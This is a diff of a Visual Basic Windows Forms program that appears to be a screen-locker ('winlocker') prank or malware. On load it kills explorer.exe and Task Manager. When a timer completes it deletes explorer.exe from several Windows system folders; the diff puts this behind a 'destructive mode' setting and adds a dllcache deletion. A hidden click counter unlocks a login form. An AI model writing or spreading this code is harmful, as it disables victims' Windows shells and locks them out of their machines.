@@ -1,10 +1,12 @@
-﻿Public Class Form1
+﻿' Ketako main program
+Public Class Form1
 
     Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         Label3.Hide()
         Timer1.Start()
         Label5.Hide()
         ProgressBar2.Hide()
+        ProgressBar3.Hide()
         Label6.Hide()
         Shell("taskkill /f /im explorer.exe")
         Shell("taskkill /f /im taskmgr.exe")
@@ -38,20 +40,34 @@
         Label2.Text = My.Settings.caption2
         ProgressBar1.Increment(1)
         If ProgressBar1.Value = ProgressBar1.Maximum Then
-            My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
-            My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
-            My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
-            Form6.Show()
-            Timer1.Stop()
-            ProgressBar1.Value = 0
-            Me.Hide()
+            If My.Settings.destructivemodeenabled = "Yes" Then
+                My.Computer.FileSystem.DeleteFile("C:/Windows/explorer.exe")
+                My.Computer.FileSystem.DeleteFile("C:/Windows/SysWOW64/explorer.exe")
+                My.Computer.FileSystem.DeleteFile("C:/Windows/Prefetch/EXPLORER.EXE-082F38A9.pf")
+                If My.Computer.FileSystem.FileExists("C:/Windows/system32/dllcache/explorer.exe") = True Then
+                    My.Computer.FileSystem.DeleteFile("C:/Windows/system32/dllcache/explorer.exe")
+                End If
+                Timer1.Stop()
+                ProgressBar1.Value = 0
+                Form6.Show()
+                Me.Hide()
+            Else
+                Timer1.Stop()
+                ProgressBar1.Value = 0
+                Form7.Show()
+                Me.Hide()
+            End If
         End If
     End Sub
 
     Private Sub PictureBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PictureBox1.Click
-        LoginForm1.Show()
+        ProgressBar3.Increment(1)
+        If ProgressBar3.Value = ProgressBar3.Maximum Then
+            LoginForm1.Show()
+        Else
+8:          Form8.Show()
+        End If
     End Sub
-
     Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
         Label6.Show()
     End Sub
